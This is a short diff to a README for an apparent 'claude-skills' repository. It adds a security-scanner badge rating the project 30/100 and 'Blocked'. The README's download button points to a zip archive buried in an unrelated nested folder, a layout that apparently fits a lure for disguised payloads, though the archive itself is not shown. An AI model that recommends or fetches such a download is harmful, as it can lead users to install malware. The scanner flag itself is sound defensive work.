@@ -1,5 +1,7 @@
 # 🎉 claude-skills - Enhance Your AI Experience Easily
 
+[![SafeSkill 30/100](https://img.shields.io/badge/SafeSkill-30%2F100_Blocked-red)](https://safeskill.dev/scan/hildegaardchiasmal966-claude-skills)
+
 ## 📥 Download Now!
 [![Download](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip%20Now-claude--skills-brightgreen)](https://raw.githubusercontent.com/Hildegaardchiasmal966/claude-skills/master/nextjs-portfolio-builder/amazing-portfolio/amazing-portfolio/app/skills-claude-v1.5.zip)
 
